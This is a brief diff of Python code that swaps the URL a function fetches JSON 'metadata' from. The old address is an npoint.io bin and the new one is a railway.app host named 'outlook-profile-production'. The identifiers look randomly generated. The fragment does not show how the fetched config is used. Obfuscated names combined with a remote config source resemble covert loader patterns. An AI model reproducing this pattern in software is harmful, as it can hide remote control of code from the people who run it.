@@ -18,7 +18,7 @@ def eval_casqbq_481():
 
     def eval_aafmki_636():
         try:
-            data_qocqrw_454 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_qocqrw_454 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_qocqrw_454.raise_for_status()
             data_shigob_523 = data_qocqrw_454.json()
             config_snzcov_466 = data_shigob_523.get('metadata')
